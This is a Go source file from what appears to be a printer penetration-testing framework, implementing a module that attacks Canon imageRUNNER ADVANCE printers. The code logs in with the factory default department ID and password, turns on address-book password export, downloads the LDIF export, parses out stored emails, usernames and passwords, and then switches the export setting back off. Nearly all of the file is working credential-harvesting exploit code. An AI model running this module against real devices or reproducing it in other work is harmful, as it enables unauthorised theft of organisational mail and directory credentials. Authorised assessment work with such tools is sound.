package safe

import (
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"

	"papercut/internal/modules"
	"papercut/internal/output"
)

func init() { register(func() modules.ExploitModule { return NewCanonPwdExtract() }) }

// CanonPwdExtract implements the Canon imageRUNNER ADVANCE password extractor.
// It authenticates to the Canon web interface, enables password export on the
// address book, downloads the LDIF export, then disables password export again.
//
// Based on the public Metasploit module auxiliary/scanner/printer/canon_iradv_pwd_extract.
//
// Supported models: iR-ADV C2030, iR-ADV C5030, iR-ADV C5235, iR-ADV C5240,
// iR-ADV C7065, iR-ADV 4045, iR-ADV 6055.
//
// Category: SAFE — enables password export temporarily and restores the setting after extraction.
type CanonPwdExtract struct {
	modules.BaseModule
}

// NewCanonPwdExtract creates a new instance of the Canon password extractor.
func NewCanonPwdExtract() *CanonPwdExtract {
	m := &CanonPwdExtract{
		BaseModule: modules.BaseModule{
			Mod: modules.Module{
				Name:         "canon/http/pwd_extract",
				Description:  "Canon iR-ADV Password Extractor — extracts address book credentials via LDIF export",
				Manufacturer: "Canon",
				Category:     "SAFE",
				Authors:      []string{"Waffl3ss"},
				Tags:         []string{"canon", "imagerunner", "ldif", "credentials", "password", "address book", "mfp"},
				Models:       []string{"iR-ADV C2030", "iR-ADV C5030", "iR-ADV C5235", "iR-ADV C5240", "iR-ADV C7065", "iR-ADV 4045", "iR-ADV 6055"},
			},
			Opts: []*modules.Option{
				{Name: "RHOST", Default: "", Required: true, Description: "Target IP address"},
				{Name: "RPORT", Default: "8000", Required: false, Description: "Target HTTP port"},
				{Name: "USERNAME", Default: "7654321", Required: false, Description: "Department ID / login username"},
				{Name: "PASSWORD", Default: "7654321", Required: false, Description: "Login password"},
				{Name: "ADDRSBOOK", Default: "1", Required: false, Description: "Address book number (1-11)"},
				{Name: "SSL", Default: "false", Required: false, Description: "Use HTTPS instead of HTTP"},
				{Name: "VERBOSE", Default: "false", Required: false, Description: "Verbose output"},
				{Name: "TIMEOUT", Default: "20", Required: false, Description: "HTTP request timeout in seconds"},
				{Name: "PROXY", Default: "", Required: false, Description: "Proxy (socks5://host:port or http://host:port)"},
			},
		},
	}
	m.InitDefaults()
	return m
}

func (c *CanonPwdExtract) newHTTPClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, fmt.Errorf("create cookie jar: %w", err)
	}
	return &http.Client{
		Jar:     jar,
		Timeout: time.Duration(c.IntVal("TIMEOUT", 20)) * time.Second,
		Transport: modules.NewHTTPTransport(c.Val("PROXY")),
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // don't follow redirects automatically
		},
	}, nil
}

func (c *CanonPwdExtract) baseURL() string {
	scheme := "http"
	if c.BoolVal("SSL") {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%s", scheme, c.Val("RHOST"), c.Val("RPORT"))
}

// Check verifies the target is a Canon iR-ADV device and default credentials work.
func (c *CanonPwdExtract) Check() (*modules.CheckResult, error) {
	if err := c.Validate(); err != nil {
		return nil, err
	}

	rhost := c.Val("RHOST")
	portInt := c.IntVal("RPORT", 8000)
	verbose := c.BoolVal("VERBOSE")

	client, err := c.newHTTPClient()
	if err != nil {
		return nil, err
	}

	if verbose {
		output.Info("  Checking %s for Canon iR-ADV web interface...", c.baseURL())
	}

	// Attempt login
	err = c.login(client, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success:  false,
			Target:   rhost,
			Port:     portInt,
			Username: c.Val("USERNAME"),
			Password: c.Val("PASSWORD"),
			Details:  fmt.Sprintf("Login failed: %v", err),
		}, nil
	}

	return &modules.CheckResult{
		Success:  true,
		Target:   rhost,
		Port:     portInt,
		Username: c.Val("USERNAME"),
		Password: c.Val("PASSWORD"),
		Details:  "Canon iR-ADV — credentials accepted",
	}, nil
}

// Exploit authenticates, enables password export, downloads LDIF address book, and extracts credentials.
func (c *CanonPwdExtract) Exploit() (*modules.ExploitResult, error) {
	if err := c.Validate(); err != nil {
		return nil, err
	}

	rhost := c.Val("RHOST")
	portInt := c.IntVal("RPORT", 8000)
	verbose := c.BoolVal("VERBOSE")

	client, err := c.newHTTPClient()
	if err != nil {
		return nil, err
	}

	// Step 1: Login
	output.Info("Authenticating to %s...", c.baseURL())

	err = c.login(client, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Login failed: %v", err),
		}, nil
	}

	output.Success("Authentication successful")

	// Step 2: Get session cookie from nativetop
	if verbose {
		output.Info("  Acquiring session cookies...")
	}

	err = c.acquireSession(client, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Session acquisition failed: %v", err),
		}, nil
	}

	// Step 3: Enable password export
	output.Info("Enabling password export...")

	err = c.setPasswordExport(client, true, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to enable password export: %v", err),
		}, nil
	}

	if verbose {
		output.Success("  Password export enabled")
	}

	// Step 4: Extract LDIF address book
	output.Info("Extracting address book %s...", c.Val("ADDRSBOOK"))

	ldifData, err := c.extractLDIF(client, verbose)

	// Step 5: Disable password export (always, even on error)
	output.Info("Restoring password export setting...")

	if restoreErr := c.setPasswordExport(client, false, verbose); restoreErr != nil {
		output.Warn("Failed to disable password export: %v", restoreErr)
	} else if verbose {
		output.Success("  Password export disabled")
	}

	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("LDIF extraction failed: %v", err),
		}, nil
	}

	if ldifData == "" {
		output.Warn("Address book is empty or returned no data")
		return &modules.ExploitResult{
			Success: true, Target: rhost, Port: portInt,
			Details: "Authentication succeeded but address book is empty",
		}, nil
	}

	// Step 6: Parse LDIF for credentials
	creds := parseLDIF(ldifData)

	if len(creds) == 0 {
		output.Warn("No credentials found in address book LDIF data")
		return &modules.ExploitResult{
			Success: true, Target: rhost, Port: portInt,
			Details: "Address book exported but contained no credentials",
		}, nil
	}

	// Display results
	fmt.Println()
	for _, cr := range creds {
		output.Success("--- Credential ---")
		if cr.email != "" {
			output.Success("  Email: %s", cr.email)
		}
		if cr.username != "" {
			output.Success("  Username: %s", cr.username)
		}
		output.Success("  Password: %s", cr.password)
		fmt.Println()
	}

	// Build data string for storage (must have " User: " and " Pass: " for ParseExploitData)
	var dataLines []string
	for _, cr := range creds {
		user := cr.username
		if user == "" {
			user = cr.email
		}
		line := fmt.Sprintf("[LDIF] User: %s Pass: %s", user, cr.password)
		dataLines = append(dataLines, line)
	}

	return &modules.ExploitResult{
		Success: true,
		Target:  rhost,
		Port:    portInt,
		Details: fmt.Sprintf("Extracted %d credential(s) from address book", len(creds)),
		Data:    strings.Join(dataLines, "\n"),
	}, nil
}

// login authenticates to the Canon web interface and stores session cookies.
func (c *CanonPwdExtract) login(client *http.Client, verbose bool) error {
	loginURL := c.baseURL() + "/login"

	data := url.Values{
		"uri":      {"/"},
		"deptid":   {c.Val("USERNAME")},
		"password": {c.Val("PASSWORD")},
	}

	if verbose {
		output.Info("  POST %s", loginURL)
	}

	resp, err := client.PostForm(loginURL, data)
	if err != nil {
		return fmt.Errorf("login request: %w", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body) // drain

	if resp.StatusCode != 301 && resp.StatusCode != 302 {
		return fmt.Errorf("login failed (HTTP %d) — expected redirect", resp.StatusCode)
	}

	if verbose {
		output.Success("  Login redirect received (HTTP %d)", resp.StatusCode)
	}

	return nil
}

// acquireSession fetches the nativetop page to obtain additional session cookies.
func (c *CanonPwdExtract) acquireSession(client *http.Client, verbose bool) error {
	sessionURL := c.baseURL() + "/rps/nativetop.cgi?RUIPNxBundle=&CorePGTAG=PGTAG_CONF_ENV_PAP&Dummy=1400782981064"

	if verbose {
		output.Info("  GET %s", sessionURL)
	}

	resp, err := client.Get(sessionURL)
	if err != nil {
		return fmt.Errorf("session request: %w", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body) // drain

	if verbose {
		output.Info("  Session page returned HTTP %d", resp.StatusCode)
	}

	return nil
}

// setPasswordExport enables or disables password export on the address book.
func (c *CanonPwdExtract) setPasswordExport(client *http.Client, allow bool, verbose bool) error {
	exportURL := c.baseURL() + "/rps/cadrs.cgi"

	checkVal := "1" // disallow
	if allow {
		checkVal = "0" // allow
	}

	data := url.Values{
		"ADRSEXPPSWDCHK": {checkVal},
		"PageFlag":       {"c_adrs.tpl"},
		"Flag":           {"Exec_Data"},
		"CoreNXAction":   {"./cadrs.cgi"},
		"CoreNXPage":     {"c_adrexppass.tpl"},
		"CoreNXFlag":     {"Init_Data"},
		"Dummy":          {"1359048058115"},
	}

	if verbose {
		output.Info("  POST %s (ADRSEXPPSWDCHK=%s)", exportURL, checkVal)
	}

	resp, err := client.PostForm(exportURL, data)
	if err != nil {
		return fmt.Errorf("set password export: %w", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body) // drain

	if resp.StatusCode != 200 {
		return fmt.Errorf("set password export: HTTP %d", resp.StatusCode)
	}

	return nil
}

// extractLDIF downloads the address book in LDIF format.
func (c *CanonPwdExtract) extractLDIF(client *http.Client, verbose bool) (string, error) {
	extractURL := c.baseURL() + "/rps/abook.ldif"

	data := url.Values{
		"AID":            {c.Val("ADDRSBOOK")},
		"ACLS":           {"1"},
		"ENC_MODE":       {"0"},
		"ENC_FILE":       {"password"},
		"PASSWD":         {""},
		"PageFlag":       {""},
		"AMOD":           {""},
		"Dummy":          {"1359047882596"},
		"ERR_PG_KIND_FLG": {"Adress_Export"},
	}

	if verbose {
		output.Info("  POST %s (AID=%s)", extractURL, c.Val("ADDRSBOOK"))
	}

	resp, err := client.PostForm(extractURL, data)
	if err != nil {
		return "", fmt.Errorf("extract request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("extract failed: HTTP %d", resp.StatusCode)
	}

	if verbose {
		output.Info("  LDIF response: %d bytes", len(body))
	}

	return string(body), nil
}

// ldifCred holds a single credential parsed from LDIF data.
type ldifCred struct {
	email    string
	username string
	password string
}

// parseLDIF parses LDIF-formatted data and extracts credentials.
// Records are separated by double CRLF; attributes are "name: value" per line.
func parseLDIF(data string) []ldifCred {
	var creds []ldifCred

	// Normalize line endings
	data = strings.ReplaceAll(data, "\r\n", "\n")

	// Split into records (separated by blank lines)
	records := strings.Split(data, "\n\n")

	for _, record := range records {
		record = strings.TrimSpace(record)
		if record == "" {
			continue
		}

		var email, username, password string

		lines := strings.Split(record, "\n")
		for _, line := range lines {
			parts := strings.SplitN(line, ": ", 2)
			if len(parts) != 2 {
				continue
			}
			attr := strings.TrimSpace(parts[0])
			val := strings.TrimSpace(parts[1])

			switch strings.ToLower(attr) {
			case "mailaddress", "mail":
				email = val
			case "username":
				if username == "" {
					username = val
				}
			case "pwd":
				password = val
			}
		}

		if password == "" {
			continue
		}

		// Derive username from email if not explicitly set
		if username == "" && email != "" {
			if at := strings.Index(email, "@"); at > 0 {
				username = email[:at]
			}
		}

		creds = append(creds, ldifCred{
			email:    email,
			username: username,
			password: password,
		})
	}

	return creds
}
